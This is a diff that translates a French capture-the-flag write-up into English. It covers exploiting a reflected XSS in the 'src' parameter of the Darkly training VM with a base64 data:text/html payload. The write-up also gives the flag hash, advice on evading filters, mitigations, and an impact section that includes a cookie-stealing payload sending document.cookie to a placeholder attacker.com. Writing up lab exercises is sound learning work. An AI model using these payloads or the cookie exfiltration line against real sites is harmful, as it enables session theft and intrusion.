@@ -1,85 +1,133 @@
-Exploitation XSS (Reflected XSS) sur Darkly (Paramètre src)
+## Exploiting Reflected XSS on Darkly (Parameter: `src`)
 
-Objectif : Exploiter une vulnérabilité XSS dans le paramètre src de la page media 
+### Objective
+Exploit a reflected XSS vulnerability in the `src` parameter of the media page.
 
-URL cible : http://192.168.1.33/?page=media&src=<value>
+Target URL:
+```
+http://192.168.1.33/?page=media&src=<value>
+```
 
-Analyse initiale
+---
 
-    La page media utilise le paramètre src pour inclure et afficher des ressources externes via des balises HTML comme <object>.
-        <object data="test"></object>
+### Initial Analysis
 
-    En inspectant l'application, aucune validation ou filtrage des entrées utilisateur sur ce paramètre n'a été détectée.
+The media page utilizes the `src` parameter to include and display external resources via HTML tags such as `<object>`:
 
-    Hypothèse : il est possible d'injecter un script dans ce paramètre pour exécuter un XSS (Cross-Site Scripting).
+```html
+<object data="test"></object>
+```
 
-=>Injection initiale
+After inspecting the application, no validation or filtering of user input for this parameter was detected. This led to the hypothesis that a script could be injected into this parameter to execute a reflected XSS (Cross-Site Scripting) attack.
 
-    Une première tentative avec un script simple dans le paramètre src :
+---
 
-    http://192.168.1.33/?page=media&src=<script>alert('XSS')</script>
+### Exploitation Attempts
 
-    Résultat : La balise <script> est ignorée ou filtrée. L'attaque échoue.
+#### 1. Initial Injection
 
-=>Utilisation d’une balise <object>
+A simple script injection was attempted using the `src` parameter:
 
-    Hypothèse : la page media utilise des balises comme <object> pour afficher le contenu spécifié dans src.
-    Tentative avec une balise <object> :
+```
+http://192.168.1.33/?page=media&src=<script>alert('XSS')</script>
+```
 
-    <object data="javascript:alert('XSS')"></object>
+**Result:**
+The `<script>` tag was either ignored or filtered, and the attack failed.
 
-    Résultat : Cette méthode échoue également car certains navigateurs ou configurations désactivent javascript: dans data.
+---
 
-=>>>>Injection via data:text/html
+#### 2. Using `<object>` Tag
 
-    Le schéma data:text/html permet d'injecter directement du contenu HTML ou JavaScript encodé dans une URL.
+Hypothesis: The media page uses tags like `<object>` to display content specified in `src`.
 
-    Encodage en Base64 du payload suivant :
+Attempted injection:
 
+```html
+<object data="javascript:alert('XSS')"></object>
+```
+
+**Result:**
+This method also failed as some browsers or configurations block `javascript:` in the `data` attribute.
+
+---
+
+#### 3. Injection via `data:text/html`
+
+The `data:text/html` scheme enables direct injection of HTML or JavaScript encoded within a URL.
+
+- Payload to encode:
+
+```html
 <script>alert('XSS')</script>
+```
 
-Encodé en Base64 : PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+- Base64 Encoded Payload:
 
-Construction de l'URL avec le schéma data:text/html :
+```
+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+```
 
+- Constructed URL:
+
+```
 http://192.168.1.33/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+```
 
-Résultat : Succès. Le flag est là!
+**Result:**
+Success! The XSS executed, and the flag was retrieved:
 
+```
 The flag is: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac41
+```
 
-----------------------------------------------------------------------------
-Pourquoi data:text/html fonctionne-t-il ?
+---
 
-    Le schéma data: permet d'insérer directement des données dans une ressource HTML ou une balise.
-    Le contenu encodé en Base64 est interprété comme du HTML par la balise <object>.
-    Dans ce cas, aucun filtrage ou validation n'est appliqué par l'application, permettant l'exécution du code JavaScript.
+### Why Does `data:text/html` Work?
 
-Pourquoi l'encodage Base64 ?
+- The `data:` scheme allows embedding data directly in an HTML resource.
+- The Base64-encoded content is interpreted as HTML by the `<object>` tag.
+- In this case, the application applies no filtering or validation, allowing JavaScript execution.
 
-    L'encodage Base64 aide à contourner certains filtres ou pare-feu en masquant les caractères dangereux (<, >, ").
-    Lorsqu'il est utilisé avec le schéma data:, il permet une injection discrète et directe de contenu.
-----------------------------------------------------------------------------
+#### Benefits of Base64 Encoding
 
-Mesures de sécurité
+- Encodes dangerous characters (`<`, `>`, `"`) to bypass filters or firewalls.
+- Enables discreet and direct injection of malicious content using the `data:` scheme.
 
-    Validation des entrées :
-        Rejeter toute entrée contenant des schémas non autorisés (data:, javascript:).
-        Rejeter tout contenu contenant des caractères potentiellement dangereux (<, >, ", ', ;, etc.).
-        Utiliser des whitelists pour autoriser uniquement des valeurs spécifiques.
+---
 
-    Encodage des sorties :
-        Encoder toutes les données utilisateur avant de les insérer dans une page web.
+### Security Measures to Mitigate XSS
 
-    CSP (Content Security Policy) :
-        Empêcher l'exécution de scripts externes ou injectés.
+1. **Input Validation:**
+   - Reject entries containing unauthorized schemes (e.g., `data:`, `javascript:`).
+   - Reject content with potentially dangerous characters (`<`, `>`, `"`, `'`, `;`).
+   - Use whitelists to allow only specific values.
 
-----------------------------------------------------
-Impact des XSS
+2. **Output Encoding:**
+   - Encode all user data before inserting it into a web page.
 
-    Vol de cookies et de sessions :
-        Exemple : <script>document.write('<img src="http://attacker.com?c='+document.cookie+'">');</script>
-    Défacement de page :
-        Exemple : <script>document.body.innerHTML="Hacked by Attacker";</script>
-    Redirection :
-        Exemple : <script>window.location.href="http://attacker.com";</script>
+3. **Content Security Policy (CSP):**
+   - Implement CSP to block the execution of injected or external scripts.
+
+---
+
+### Impact of XSS
+
+1. **Session Hijacking:**
+   Example:
+   ```html
+   <script>document.write('<img src="http://attacker.com?c='+document.cookie+'">');</script>
+   ```
+
+2. **Defacement:**
+   Example:
+   ```html
+   <script>document.body.innerHTML="Hacked by Attacker";</script>
+   ```
+
+3. **Redirection:**
+   Example:
+   ```html
+   <script>window.location.href="http://attacker.com";</script>
+   ```
+
